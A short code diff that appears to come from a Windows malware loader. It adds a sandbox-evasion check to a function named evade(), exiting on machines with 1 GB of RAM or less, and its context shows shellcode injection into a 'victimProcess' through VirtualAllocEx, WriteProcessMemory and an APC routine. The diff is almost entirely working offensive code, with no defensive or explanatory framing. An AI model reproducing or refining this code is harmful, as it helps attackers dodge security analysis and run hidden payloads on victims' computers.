@@ -79,6 +79,18 @@ void evade() {
         exit(0);
     }
 
+	MEMORYSTATUSEX statex;
+	statex.dwLength = sizeof(statex);
+
+	GlobalMemoryStatusEx(&statex);
+
+	ULONGLONG totalPhysicalMemoryInGB = statex.ullTotalPhys / (1024 * 1024 * 1024);
+
+	if (totalPhysicalMemoryInGB <= 1) {
+		exit(1);
+	}
+
+
     CheckVirtualAllocExNuma();
 
 };
@@ -100,10 +112,8 @@ int main() {
 	HANDLE victimProcess = pi.hProcess;
 	HANDLE threadHandle = pi.hThread;
 
-	// Use payload.size() for the size.
 	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-	// Directly use the vector's data for WriteProcessMemory.
 	WriteProcessMemory(victimProcess, shellAddress, payload.data(), payload.size(), NULL);
 
 	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
